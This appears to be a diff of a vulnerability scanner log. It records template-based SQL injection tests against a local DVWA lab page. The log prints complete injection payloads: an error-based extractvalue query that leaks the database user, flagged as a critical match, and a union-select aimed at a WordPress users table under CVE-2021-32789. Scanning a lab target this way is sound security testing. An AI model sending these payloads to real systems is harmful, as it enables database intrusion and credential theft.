+[VER] [yeswiki-sql] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&Submit=Submit&PagePrincipale/rss
+[yeswiki-sql] [http] [critical] http://localhost:4280/vulnerabilities/sqli/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&Submit=Submit&PagePrincipale/rss
+[VER] [CVE-2021-32789] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500
+[WRN] [CVE-2023-34362] Could not execute request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: cause="context deadline exceeded (Client.Timeout exceeded while awaiting headers)" chain="got err while executing https://checkip.amazonaws.com:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit"
+[INF] Scan completed in 26.903188585s. 1 matches found.
